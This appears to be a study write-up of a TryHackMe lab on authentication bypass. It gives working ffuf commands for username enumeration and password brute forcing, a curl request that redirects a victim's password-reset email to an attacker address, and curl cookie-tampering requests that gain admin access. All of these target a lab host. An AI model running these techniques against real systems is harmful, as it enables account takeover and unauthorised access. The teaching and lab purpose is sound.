Here are the methods of bypassing authentication, these vulnerabilities are often the most critical, because they leak personal data.

## Username enumeration

Username enumeration with ffuf

```shell
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.54.80/customers/signup -mr "username already exists"
```
Based on the response "username already exists" we can fuzz this login form with wordlist of names, and end up with list of users.

## Brute force
  
Bruteforcing with ffuf
Using this fuzzer, we can bruteforce the web requests with customized http requests.
And utilizing wordlists for names or passowrds.

```shell
user@tryhackme$ ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.54.80/customers/login -fc 200
```

## Logic  flaw

```php
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```

Logic flaws can happen anywhere in the application but we are focusing on authentication in this segment.
In this PHP code example, the code uses === for comparison, which check literally one for one.
But let's say we try to access the admin page via /adMin or any other capitalized permutation of this path.
The check will return false and else block is executed, aka we bypassed the logical check.
#### Password reset logic flaw

In the second step of the reset email process, the username is submitted in a POST field to the web server, and the email address is sent in the query string request as a GET field.  

Let's illustrate this by using the curl tool to manually make the request to the webserver.  

**Curl Request 1:**

```shell
user@tryhackme$ curl 'http://10.10.54.80/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
```

We use the `-H` flag to add an additional header to the request. In this instance, we are setting the `Content-Type` to `application/x-www-form-urlencoded`, which lets the web server know we are sending form data so it properly understands our request.  

In the application, the user account is retrieved using the query string, but later on, in the application logic, the password reset email is sent using the data found in the PHP variable `$_REQUEST`.

The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favours POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered.  

**Curl Request 2:**

```shell
user@tryhackme$ curl 'http://10.10.54.80/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```

To clear the confusion:
First you create your own account so you can recieve support tickets.
Now making the curl request 1 with both robert as username and roberts email as data of the request.
On the second curl we change the data as such, first the target stays robert but last in data email is set as attacker email.

This will create a ticket accessible to you with link to direct access to the roberts account because fuck security lol.


## Cookie Tampering

**Plain Text**

The contents of some cookies can be in plain text, and it is obvious what they do. Take, for example, if these were the cookie set after a successful login:

**Set-Cookie: logged_in=true; Max-Age=3600; Path=/**  
****Set-Cookie: admin=false; Max-Age=3600; Path=/****

We see one cookie (logged_in), which appears to control whether the user is currently logged in or not, and another (admin), which controls whether the visitor has admin privileges. Using this logic, if we were to change the contents of the cookies and make a request we'll be able to change our privileges.

First, we'll start just by requesting the target page:  

Curl Request 1

```shell
curl http://10.10.54.80/cookie-test
```

We can see we are returned a message of: **Not Logged In**

Now we'll send another request with the logged_in cookie set to true and the admin cookie set to false:  

Curl Request 2

```shell
curl -H "Cookie: logged_in=true; admin=false" http://10.10.54.80/cookie-test
```

We are given the message: **Logged In As A User**

Finally, we'll send one last request setting both the logged_in and admin cookie to true:

Curl Request 3

```shell
curl -H "Cookie: logged_in=true; admin=true" http://10.10.54.80/cookie-test
```

This returns the result: **Logged In As An Admin** as well as a flag which you can use to answer question one.

Cookies are hopefully not in plain text and rather hashed with algorithms such as sha-512.
Or encoded (which is reversible) via base32 or 64.
